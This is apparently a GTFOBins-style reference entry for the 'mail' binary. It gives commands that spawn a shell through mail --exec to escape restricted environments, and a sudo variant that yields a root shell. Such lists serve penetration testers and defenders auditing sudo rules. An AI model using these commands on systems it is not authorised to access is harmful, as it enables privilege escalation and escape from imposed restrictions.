# GTFOBin: mail

## Shell

It can be used to break out from restricted environments by spawning an interactive system shell.

GNU version only.

```
mail --exec='!/bin/sh'
```

This creates a valid Mbox file which may be required by the binary.

```
TF=$(mktemp)
echo "From nobody@localhost $(date)" > $TF
mail -f $TF
!/bin/sh
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

GNU version only.

```
sudo mail --exec='!/bin/sh'
```